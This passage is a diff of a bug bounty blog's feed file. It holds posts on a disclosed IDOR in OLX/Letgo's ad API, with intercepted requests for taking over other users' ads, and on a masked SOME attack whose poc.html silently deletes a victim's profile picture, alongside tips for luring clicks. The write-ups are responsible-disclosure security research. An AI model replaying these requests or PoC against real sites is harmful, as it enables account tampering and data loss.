-&lt;p&gt;Because there was no rate limiting in place and the API supported walking through the full listing of all the ads, there was a potential for building a small script that does exactly that. Loop all the ads, take over each ad, change the pricing. This way it was possible to take over the entire collection of ads on the website.&lt;/p&gt;
+<p>Because there was no rate limiting in place and the API supported walking through the full listing of all the ads, there was a potential for building a small script that does exactly that. Loop all the ads, take over each ad, change the pricing. This way it was possible to take over the entire collection of ads on the website.</p>
 
-&lt;p&gt;Of course it’s not a good idea to actually do so, no need to prove anything this severe and cause damage. So right after verifying the initial IDOR and the moment I saw the potential I reported the issue. Also note that I did not take over any ads that were not mine: always use multiple test accounts! Safety first.&lt;/p&gt;
+<p>Of course it’s not a good idea to actually do so, no need to prove anything this severe and cause damage. So right after verifying the initial IDOR and the moment I saw the potential I reported the issue. Also note that I did not take over any ads that were not mine: always use multiple test accounts! Safety first.</p>
 
-&lt;h1 id=&quot;how-i-found-the-idor&quot;&gt;How I found the IDOR&lt;/h1&gt;
-&lt;p&gt;Having OLX permission: full disclosure time!&lt;/p&gt;
+<h1 id="how-i-found-the-idor">How I found the IDOR</h1>
+<p>Having OLX permission: full disclosure time!</p>
 
-&lt;p&gt;First of all we need to proxy the traffic coming from the iOS / Android apps. This traffic is SSL encrypted which is fine: just import the CA BurpSuite provisions for you. But nowadays some apps implement SSL pinning, meaning the BurpSuite CA does not work out of the box. You can bypass this added layer of protection by unpinning SSL. One way would be reverse engineering the app and patching out the checks, but a much easier way is to unpin system wide.&lt;/p&gt;
+<p>First of all we need to proxy the traffic coming from the iOS / Android apps. This traffic is SSL encrypted which is fine: just import the CA BurpSuite provisions for you. But nowadays some apps implement SSL pinning, meaning the BurpSuite CA does not work out of the box. You can bypass this added layer of protection by unpinning SSL. One way would be reverse engineering the app and patching out the checks, but a much easier way is to unpin system wide.</p>
 
-&lt;p&gt;So I have set up both a jailbroken iPad with SSL pinning disabled (using a cydia app) and an Android phone with SSL pinning disabled (using an Xposed module). This way you can always intercept traffic using a proxy like BurpSuite and (almost) any app. Note that you can just as easily set up Android emulators to accomplish the same goal (try genymotion or android studio).&lt;/p&gt;
+<p>So I have set up both a jailbroken iPad with SSL pinning disabled (using a cydia app) and an Android phone with SSL pinning disabled (using an Xposed module). This way you can always intercept traffic using a proxy like BurpSuite and (almost) any app. Note that you can just as easily set up Android emulators to accomplish the same goal (try genymotion or android studio).</p>
 
-&lt;p&gt;By intercepting the API calls during browsing of your iOS and Android apps, you can learn about-, change- and repeat API calls.&lt;/p&gt;
+<p>By intercepting the API calls during browsing of your iOS and Android apps, you can learn about-, change- and repeat API calls.</p>
 
-&lt;p&gt;Setup test accounts:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Android account: token ‘111111’&lt;/li&gt;
-  &lt;li&gt;iOS     account: token ‘222222’&lt;/li&gt;
-&lt;/ul&gt;
+<p>Setup test accounts:</p>
+<ul>
+  <li>Android account: token ‘111111’</li>
+  <li>iOS     account: token ‘222222’</li>
+</ul>
 
-&lt;p&gt;ACCOUNT_1:&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Post a new ad using token ‘111111’ (returns the ID, in this test case: 888888).&lt;/li&gt;
-  &lt;li&gt;Wait for approval&lt;/li&gt;
-  &lt;li&gt;Approved and published on site&lt;/li&gt;
-&lt;/ol&gt;
+<p>ACCOUNT_1:</p>
+<ol>
+  <li>Post a new ad using token ‘111111’ (returns the ID, in this test case: 888888).</li>
+  <li>Wait for approval</li>
+  <li>Approved and published on site</li>
+</ol>
 
-&lt;p&gt;ACCOUNT_2:&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Fetch advertisement list through a search api call&lt;/li&gt;
-  &lt;li&gt;Attack an ad by doing a POST call (picked the newly posted 888888 here).&lt;/li&gt;
-  &lt;li&gt;The takeover of the ad is instant: it’s now in ACCOUNT_2, not in ACCOUNT_1 anymore&lt;/li&gt;
-  &lt;li&gt;Wait for approval&lt;/li&gt;
-  &lt;li&gt;Approved and published on site with my changes&lt;/li&gt;
-&lt;/ol&gt;
+<p>ACCOUNT_2:</p>
+<ol>
+  <li>Fetch advertisement list through a search api call</li>
+  <li>Attack an ad by doing a POST call (picked the newly posted 888888 here).</li>
+  <li>The takeover of the ad is instant: it’s now in ACCOUNT_2, not in ACCOUNT_1 anymore</li>
+  <li>Wait for approval</li>
+  <li>Approved and published on site with my changes</li>
+</ol>
 
-&lt;p&gt;The attack - using ACCOUNT_2 - involves two api calls: GET /i2/ajax/ads/ (to get id’s) and POST /i2/newadding/ (to take over and make changes).&lt;/p&gt;
+<p>The attack - using ACCOUNT_2 - involves two api calls: GET /i2/ajax/ads/ (to get id’s) and POST /i2/newadding/ (to take over and make changes).</p>
 
-&lt;p&gt;The GET call lists all the ads including id’s (paginated) and looks like this:&lt;/p&gt;
+<p>The GET call lists all the ads including id’s (paginated) and looks like this:</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET /i2/ajax/ads/?json=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;app\_ios=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;brand=Letgo&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;client=ios&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;version=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;token=222222&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;location=1,1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;lang=en&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Blat%5D=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Blon%5D=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Border%5D=dist&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Bdistance%5D=20000 HTTP/1.1
+<figure class="highlight"><pre><code class="language-html" data-lang="html">GET /i2/ajax/ads/?json=1<span class="err">&amp;</span>app\_ios=285<span class="err">&amp;</span>brand=Letgo<span class="err">&amp;</span>client=ios<span class="err">&amp;</span>version=285<span class="err">&amp;</span>token=222222<span class="err">&amp;</span>location=1,1<span class="err">&amp;</span>lang=en<span class="err">&amp;</span>search%5Blat%5D=1<span class="err">&amp;</span>search%5Blon%5D=1<span class="err">&amp;</span>search%5Border%5D=dist<span class="err">&amp;</span>search%5Bdistance%5D=20000 HTTP/1.1
 Host: letgonl-a.akamaihd.net
 Connection: close
 Accept: */*
 User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1           Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
-X-Origin-OLX: production&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+X-Origin-OLX: production</code></pre></figure>
 
-&lt;p&gt;The POST call - the actual attack / IDOR - looks like this:&lt;/p&gt;
+<p>The POST call - the actual attack / IDOR - looks like this:</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;POST /i2/newadding/?json=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;app_ios=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;brand=Letgo&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;client=ios&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;version=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;token=222222&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;location=1,1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;lang=en HTTP/1.1
+<figure class="highlight"><pre><code class="language-html" data-lang="html">POST /i2/newadding/?json=1<span class="err">&amp;</span>app_ios=285<span class="err">&amp;</span>brand=Letgo<span class="err">&amp;</span>client=ios<span class="err">&amp;</span>version=285<span class="err">&amp;</span>token=222222<span class="err">&amp;</span>location=1,1<span class="err">&amp;</span>lang=en HTTP/1.1
 Host: letgonl-a.akamaihd.net
 Content-Type: application/json
 Content-Length: 222
@@ -415,122 +415,122 @@ User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) Apple
 Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
 X-Origin-OLX: production
 
-{&quot;ad_id&quot;:888888,&quot;params&quot;:{&quot;price&quot;:&quot;35&quot;},&quot;description&quot;:&quot;This is awesome&quot;,&quot;person&quot;:&quot;nickname&quot;,&quot;title&quot;:&quot;My title&quot;,&quot;category_id&quot;:&quot;800&quot;,&quot;locations&quot;:[{&quot;map_lon&quot;:1,&quot;map_lat&quot;:2}]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+{"ad_id":888888,"params":{"price":"35"},"description":"This is awesome","person":"nickname","title":"My title","category_id":"800","locations":[{"map_lon":1,"map_lat":2}]}</code></pre></figure>
 
-&lt;p&gt;Note that I’m just repeating the GET and POST calls I intercepted, replacing the token from ACCOUNT_1 with the token from ACCOUNT_2.&lt;/p&gt;
+<p>Note that I’m just repeating the GET and POST calls I intercepted, replacing the token from ACCOUNT_1 with the token from ACCOUNT_2.</p>
 
-&lt;p&gt;Again I would like to emphasize you must always use test accounts, never cause damage, think before you act. It’s a lot of fun, but it’s not a game!&lt;/p&gt;
+<p>Again I would like to emphasize you must always use test accounts, never cause damage, think before you act. It’s a lot of fun, but it’s not a game!</p>
 
-&lt;p&gt;My suggested fix was: ‘The update POST call does check for something like “is_authenticated()” but it appears it does not check for “is_authorized()”, which in turn could implement something like “is_owner()”.’&lt;/p&gt;
+<p>My suggested fix was: ‘The update POST call does check for something like “is_authenticated()” but it appears it does not check for “is_authorized()”, which in turn could implement something like “is_owner()”.’</p>
 
-&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons learned&lt;/h1&gt;
-&lt;ol&gt;
-  &lt;li&gt;Focus on bug bounty programs with a good track record. Chasing should not be nescessary, it’s a two way street. And #NoFreeBugs.&lt;/li&gt;
-  &lt;li&gt;Know when to stop attacking one specific issue or platform. Got stuck? Keep on moving! Write down your notes on what you have found so far and come back later.&lt;/li&gt;
-&lt;/ol&gt;
+<h1 id="lessons-learned">Lessons learned</h1>
+<ol>
+  <li>Focus on bug bounty programs with a good track record. Chasing should not be nescessary, it’s a two way street. And #NoFreeBugs.</li>
+  <li>Know when to stop attacking one specific issue or platform. Got stuck? Keep on moving! Write down your notes on what you have found so far and come back later.</li>
+</ol>
 
-&lt;p&gt;Let’s keep on hacking!&lt;/p&gt;
+<p>Let’s keep on hacking!</p>
 
-&lt;p&gt;Cheers,
-kciredor&lt;/p&gt;</content><author><name>Roderick Schaefer</name></author><summary type="html">Public disclosure Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!</summary></entry><entry><title type="html">First bounty, time to step up my game</title><link href="https://kciredor.com/first-bounty-time-to-step-up-my-game.html" rel="alternate" type="text/html" title="First bounty, time to step up my game" /><published>2017-09-19T15:20:00+02:00</published><updated>2017-09-19T15:20:00+02:00</updated><id>https://kciredor.com/first-bounty-time-to-step-up-my-game</id><content type="html" xml:base="https://kciredor.com/first-bounty-time-to-step-up-my-game.html">&lt;h1 id=&quot;what-happened&quot;&gt;What happened&lt;/h1&gt;
-&lt;p&gt;Hello again and thanks for reading my second blog post! After publishing my &lt;a href=&quot;/my-first-month-as-a-full-time-bug-bounty-hunter.html&quot;&gt;first blog&lt;/a&gt; I kept on trying to hack different companies and websites. Not as easy as I had hoped for! It took me quite some time to find another security issue after the IDOR in my &lt;a href=&quot;/my-first-month-as-a-full-time-bug-bounty-hunter.html&quot;&gt;first month&lt;/a&gt;. This SOME issue I found is not to be made public, so I won’t be able to mention company details and will have to mask url’s etc.&lt;/p&gt;
+<p>Cheers,
+kciredor</p>]]></content><author><name>Roderick Schaefer</name></author><category term="bugbounty" /><category term="infosec" /><category term="security" /><category term="olx" /><category term="idor" /><category term="high" /><category term="automated" /><summary type="html"><![CDATA[Public disclosure Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!]]></summary></entry><entry><title type="html">First bounty, time to step up my game</title><link href="https://kciredor.com/first-bounty-time-to-step-up-my-game.html" rel="alternate" type="text/html" title="First bounty, time to step up my game" /><published>2017-09-19T15:20:00+02:00</published><updated>2017-09-19T15:20:00+02:00</updated><id>https://kciredor.com/first-bounty-time-to-step-up-my-game</id><content type="html" xml:base="https://kciredor.com/first-bounty-time-to-step-up-my-game.html"><![CDATA[<h1 id="what-happened">What happened</h1>
+<p>Hello again and thanks for reading my second blog post! After publishing my <a href="/my-first-month-as-a-full-time-bug-bounty-hunter.html">first blog</a> I kept on trying to hack different companies and websites. Not as easy as I had hoped for! It took me quite some time to find another security issue after the IDOR in my <a href="/my-first-month-as-a-full-time-bug-bounty-hunter.html">first month</a>. This SOME issue I found is not to be made public, so I won’t be able to mention company details and will have to mask url’s etc.</p>
 
-&lt;h1 id=&quot;some-attack&quot;&gt;SOME attack&lt;/h1&gt;
-&lt;p&gt;Extensive recon of different websites owned by my target company learned that they were using an old version of an upload plugin. This plugin attempts to allow user uploads for as many different browsers and versions as possible and includes a flash component. Funny thing is this flash component was vulnerable to XSS:&lt;/p&gt;
+<h1 id="some-attack">SOME attack</h1>
+<p>Extensive recon of different websites owned by my target company learned that they were using an old version of an upload plugin. This plugin attempts to allow user uploads for as many different browsers and versions as possible and includes a flash component. Funny thing is this flash component was vulnerable to XSS:</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-url&quot; data-lang=&quot;url&quot;&gt;https://company.com/lib/upload.swf/?target%g=alert&amp;amp;uid%g=kciredor&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<figure class="highlight"><pre><code class="language-url" data-lang="url">https://company.com/lib/upload.swf/?target%g=alert&amp;uid%g=kciredor</code></pre></figure>
 
-&lt;p&gt;This wil pop an alert box containing kciredor. How did I know? While browsing the website and proxying everything through Burp to create a sitemap, the Retire.js chrome extension pointed out that this specific library was out of date. So I started looking into it and searched for published issues.&lt;/p&gt;
+<p>This wil pop an alert box containing kciredor. How did I know? While browsing the website and proxying everything through Burp to create a sitemap, the Retire.js chrome extension pointed out that this specific library was out of date. So I started looking into it and searched for published issues.</p>
 
-&lt;p&gt;So far so good but it does not end with an alert of my nickname. Can I also alert document.cookie for instance? The anwser is: no. Simply reporting this XSS right now would end up getting myself in trouble, because I cannot prove exploitability. Cloning the library from github including submodules and browsing through the code I found out the target parameter has a regex filter like this: a-zA-Z0-9._ and the uid parameter has a regex filter like this: a-zA-Z0-9_ which does not leave us a lot of room to get things done.&lt;/p&gt;
+<p>So far so good but it does not end with an alert of my nickname. Can I also alert document.cookie for instance? The anwser is: no. Simply reporting this XSS right now would end up getting myself in trouble, because I cannot prove exploitability. Cloning the library from github including submodules and browsing through the code I found out the target parameter has a regex filter like this: a-zA-Z0-9._ and the uid parameter has a regex filter like this: a-zA-Z0-9_ which does not leave us a lot of room to get things done.</p>
 
-&lt;p&gt;This is where I want to thank smiegles for giving me a heads up on SOME attacks: Same Origin Method Execution. There’s even a PoC to get inspired! The impact of SOME attacks is roughly the same as XSS. Using only alphanumeric input and a dot is enough to make a SOME attack work, meaning this could do the trick! Ben Hayak wrote an excellent &lt;a href=&quot;http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf&quot;&gt;whitepaper&lt;/a&gt; on these kind of attacks.&lt;/p&gt;
+<p>This is where I want to thank smiegles for giving me a heads up on SOME attacks: Same Origin Method Execution. There’s even a PoC to get inspired! The impact of SOME attacks is roughly the same as XSS. Using only alphanumeric input and a dot is enough to make a SOME attack work, meaning this could do the trick! Ben Hayak wrote an excellent <a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf">whitepaper</a> on these kind of attacks.</p>
 
-&lt;p&gt;In the context of the website I was attacking I tried to build a DOM path to the user profile delete button, but to no avail: yes it calls the delete profile function but there’s a confirm box asking if you really want to delete your profile. This kind of user interaction is not what we’re looking for. Trying to manually submit the form by calling the form submit function I found out the submit name was DOM clobbered by a form input. Come on, lol! But finally a call to the delete profile picture worked out just fine. This function was well hidden but I found it by downloading all the obfuscated/concatenated javascript the site had to offer and analyzing it after deobfuscation.&lt;/p&gt;
+<p>In the context of the website I was attacking I tried to build a DOM path to the user profile delete button, but to no avail: yes it calls the delete profile function but there’s a confirm box asking if you really want to delete your profile. This kind of user interaction is not what we’re looking for. Trying to manually submit the form by calling the form submit function I found out the submit name was DOM clobbered by a form input. Come on, lol! But finally a call to the delete profile picture worked out just fine. This function was well hidden but I found it by downloading all the obfuscated/concatenated javascript the site had to offer and analyzing it after deobfuscation.</p>
 
-&lt;p&gt;Now there’s only one more thing: how do I make sure someone actually clicks on the link containing my attack? That depends given the context of the website. If it’s something like eBay you could add a link claiming there’s more info and pictures behind it. Given the context of the company I was attacking it was pretty easy to find a good reason.&lt;/p&gt;
+<p>Now there’s only one more thing: how do I make sure someone actually clicks on the link containing my attack? That depends given the context of the website. If it’s something like eBay you could add a link claiming there’s more info and pictures behind it. Given the context of the company I was attacking it was pretty easy to find a good reason.</p>
 
-&lt;p&gt;The end result looked something like this (poc.html):&lt;/p&gt;
+<p>The end result looked something like this (poc.html):</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Profile picture deletion 'SOME attack' PoC --&amp;gt;&lt;/span&gt;
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="c">&lt;!-- Profile picture deletion 'SOME attack' PoC --&gt;</span>
 
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fire()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Click&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fire&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'javascript:setTimeout(&quot;location=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://company.com/lib/upload.swf?target=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling...etc...firstElementChild.click&amp;amp;uid=poc_kciredor&amp;amp;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&quot;, 2000)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'location=&quot;https://company.com/profile/&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"fire()"</span><span class="nt">&gt;</span>Click<span class="nt">&lt;/button&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">fire</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">javascript:setTimeout("location=</span><span class="se">\'</span><span class="s1">https://company.com/lib/upload.swf?target=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling...etc...firstElementChild.click&amp;uid=poc_kciredor&amp;</span><span class="se">\'</span><span class="s1">", 2000)</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">location="https://company.com/profile/"</span><span class="dl">'</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span></code></pre></figure>
 
-&lt;p&gt;What happens is this: A user is given the link to this poc.html and clicks the button. A new browser tab will be opened with our target location and after timeout the javascript will ‘click’ a DOM element that does the actual profile picture deletion. Done. My suggestion on how to fix this issue was simply to upgrade the library because the issue has been fixed in more recent versions.&lt;/p&gt;
+<p>What happens is this: A user is given the link to this poc.html and clicks the button. A new browser tab will be opened with our target location and after timeout the javascript will ‘click’ a DOM element that does the actual profile picture deletion. Done. My suggestion on how to fix this issue was simply to upgrade the library because the issue has been fixed in more recent versions.</p>
 
-&lt;h1 id=&quot;meanwhile&quot;&gt;Meanwhile&lt;/h1&gt;
-&lt;p&gt;The ‘first month IDOR issue’ has been resolved by the company, but it’s still not published. As soon as it’s publically disclosed I’ll write a detailed blog post about it, without having to mask anything! During my second month I invested a lot of time, perhaps most of my time, into coding a successor of recon.sh. I kept on having to fix and customize recon.sh to work with each and every target I tried and it kept on crashing, etc. The new setup is what I call recon-docker. It’s a python/django dockerized set of scanners with a web frontend, leveraging the usual tools like masscan and recon-ng. For now I’m able to define targets with exact scope and let it run from one or more vm’s. If a tool crashes then recon-docker will recover and continue. Next up would be continues scanning and change detection: send me a push notification as soon as company X has new sub domain Y! Hoping this investment will help me in the long run.&lt;/p&gt;
+<h1 id="meanwhile">Meanwhile</h1>
+<p>The ‘first month IDOR issue’ has been resolved by the company, but it’s still not published. As soon as it’s publically disclosed I’ll write a detailed blog post about it, without having to mask anything! During my second month I invested a lot of time, perhaps most of my time, into coding a successor of recon.sh. I kept on having to fix and customize recon.sh to work with each and every target I tried and it kept on crashing, etc. The new setup is what I call recon-docker. It’s a python/django dockerized set of scanners with a web frontend, leveraging the usual tools like masscan and recon-ng. For now I’m able to define targets with exact scope and let it run from one or more vm’s. If a tool crashes then recon-docker will recover and continue. Next up would be continues scanning and change detection: send me a push notification as soon as company X has new sub domain Y! Hoping this investment will help me in the long run.</p>
 
-&lt;h1 id=&quot;wrapping-stepping-up&quot;&gt;&lt;del&gt;Wrapping&lt;/del&gt; Stepping up&lt;/h1&gt;
-&lt;p&gt;So far I’ve found an IDOR in the first month, a SOME attack in the second month and an open S3 bucket (yet to be triaged) in the third month. Mixed feelings: out of nowhere I stepped into the world of bug bounties, having a professional background in software engineering, but not in information security let alone web hacking. So finding one bug each month so far as a beginner should be a good start… but it does not feel like it’s enough. Far from it! Bills will have to be paid for. I’m eager to pursue my dreams. So it’s time to step up my game. When I was young I fell in love with reverse engineering: disassemblers, debuggers, hex editors, you name it. Let’s find out what the possibilities are in that specific area of expertise: a healthy (?) mix between &lt;em&gt;binary exploitation/reverse engineering/vm escapes&lt;/em&gt; and &lt;em&gt;web application hacking&lt;/em&gt;.&lt;/p&gt;
+<h1 id="wrapping-stepping-up"><del>Wrapping</del> Stepping up</h1>
+<p>So far I’ve found an IDOR in the first month, a SOME attack in the second month and an open S3 bucket (yet to be triaged) in the third month. Mixed feelings: out of nowhere I stepped into the world of bug bounties, having a professional background in software engineering, but not in information security let alone web hacking. So finding one bug each month so far as a beginner should be a good start… but it does not feel like it’s enough. Far from it! Bills will have to be paid for. I’m eager to pursue my dreams. So it’s time to step up my game. When I was young I fell in love with reverse engineering: disassemblers, debuggers, hex editors, you name it. Let’s find out what the possibilities are in that specific area of expertise: a healthy (?) mix between <em>binary exploitation/reverse engineering/vm escapes</em> and <em>web application hacking</em>.</p>
 
-&lt;p&gt;Let’s keep on hacking!&lt;/p&gt;
+<p>Let’s keep on hacking!</p>
 
-&lt;p&gt;Cheers,
-kciredor&lt;/p&gt;</content><author><name>Roderick Schaefer</name></author><summary type="html">What happened Hello again and thanks for reading my second blog post! After publishing my first blog I kept on trying to hack different companies and websites. Not as easy as I had hoped for! It took me quite some time to find another security issue after the IDOR in my first month. This SOME issue I found is not to be made public, so I won’t be able to mention company details and will have to mask url’s etc.</summary></entry><entry><title type="html">My first month as a full-time bug bounty hunter</title><link href="https://kciredor.com/my-first-month-as-a-full-time-bug-bounty-hunter.html" rel="alternate" type="text/html" title="My first month as a full-time bug bounty hunter" /><published>2017-08-07T15:00:00+02:00</published><updated>2017-08-07T15:00:00+02:00</updated><id>https://kciredor.com/my-first-month-as-a-full-time-bug-bounty-hunter</id><content type="html" xml:base="https://kciredor.com/my-first-month-as-a-full-time-bug-bounty-hunter.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;Thank you for taking the time to read my first blog post. My name is Roderick Schaefer, known as kciredor in the exciting world of security bug bounties. I’m new and working hard to get very much involved. By sharing my journey and considerations so far, I’m hoping for more interested people to give it a shot!&lt;/p&gt;
+<p>Cheers,
+kciredor</p>]]></content><author><name>Roderick Schaefer</name></author><category term="bugbounty" /><category term="some" /><category term="xss" /><category term="infosec" /><category term="security" /><summary type="html"><![CDATA[What happened Hello again and thanks for reading my second blog post! After publishing my first blog I kept on trying to hack different companies and websites. Not as easy as I had hoped for! It took me quite some time to find another security issue after the IDOR in my first month. This SOME issue I found is not to be made public, so I won’t be able to mention company details and will have to mask url’s etc.]]></summary></entry><entry><title type="html">My first month as a full-time bug bounty hunter</title><link href="https://kciredor.com/my-first-month-as-a-full-time-bug-bounty-hunter.html" rel="alternate" type="text/html" title="My first month as a full-time bug bounty hunter" /><published>2017-08-07T15:00:00+02:00</published><updated>2017-08-07T15:00:00+02:00</updated><id>https://kciredor.com/my-first-month-as-a-full-time-bug-bounty-hunter</id><content type="html" xml:base="https://kciredor.com/my-first-month-as-a-full-time-bug-bounty-hunter.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<p>Thank you for taking the time to read my first blog post. My name is Roderick Schaefer, known as kciredor in the exciting world of security bug bounties. I’m new and working hard to get very much involved. By sharing my journey and considerations so far, I’m hoping for more interested people to give it a shot!</p>
 
-&lt;p&gt;My background lies in software engineering with experience in development (go, python) and operations (linux, puppet/chef, docker/kubernetes). For the past 10+ years I’ve been living as a freelancer working full-time on customer projects averaging half a year. Always felt the need to look into the security aspects of everything we did as a team.&lt;/p&gt;
+<p>My background lies in software engineering with experience in development (go, python) and operations (linux, puppet/chef, docker/kubernetes). For the past 10+ years I’ve been living as a freelancer working full-time on customer projects averaging half a year. Always felt the need to look into the security aspects of everything we did as a team.</p>
 
-&lt;p&gt;When I was still in high school my favorite hobby was reverse engineering. Changing program flow, adding new functionality without having the source code.. Found it fascinating and did not see much sun during summer holidays.&lt;/p&gt;
+<p>When I was still in high school my favorite hobby was reverse engineering. Changing program flow, adding new functionality without having the source code.. Found it fascinating and did not see much sun during summer holidays.</p>
 
-&lt;h1 id=&quot;why&quot;&gt;Why&lt;/h1&gt;
-&lt;p&gt;Traveling in beautiful Asia my mind started to get into a ‘flow’ state. What do I really want to do on a daily basis? Engineering is a lot of fun, but I could still feel the rush from back in high school when I was able to RE or hack something. Only a few months before the holidays I participated in corelanc0d3r’s advanced exploit development class which kept me thinking: could I drop everything and get into security full-time?&lt;/p&gt;
+<h1 id="why">Why</h1>
+<p>Traveling in beautiful Asia my mind started to get into a ‘flow’ state. What do I really want to do on a daily basis? Engineering is a lot of fun, but I could still feel the rush from back in high school when I was able to RE or hack something. Only a few months before the holidays I participated in corelanc0d3r’s advanced exploit development class which kept me thinking: could I drop everything and get into security full-time?</p>
 
-&lt;p&gt;There’s so many facets to security. Exploit development is awesome, but I felt there’s too much risk involved for me switching to this full-time. Payouts are high, but what if someone else gets to a bug or exploit before you, after months and months of work.. So how about bug bounty hunting, with a focus on web applications? Reading many public disclosed reports I figured this could be sustainable and most important: a ton of fun!&lt;/p&gt;
+<p>There’s so many facets to security. Exploit development is awesome, but I felt there’s too much risk involved for me switching to this full-time. Payouts are high, but what if someone else gets to a bug or exploit before you, after months and months of work.. So how about bug bounty hunting, with a focus on web applications? Reading many public disclosed reports I figured this could be sustainable and most important: a ton of fun!</p>
 
-&lt;p&gt;And that’s when I knew: this is what I have to do. Companies get hacked all the time. They can use much help of the good guys. Let’s help by hacking them and working together to prevent the bad guys from doing so. It’s such a cool business model. Everyone involved benefits. During the holiday, I kept braindumping into Evernote and felt really happy.&lt;/p&gt;
+<p>And that’s when I knew: this is what I have to do. Companies get hacked all the time. They can use much help of the good guys. Let’s help by hacking them and working together to prevent the bad guys from doing so. It’s such a cool business model. Everyone involved benefits. During the holiday, I kept braindumping into Evernote and felt really happy.</p>
 
-&lt;h1 id=&quot;how&quot;&gt;How&lt;/h1&gt;
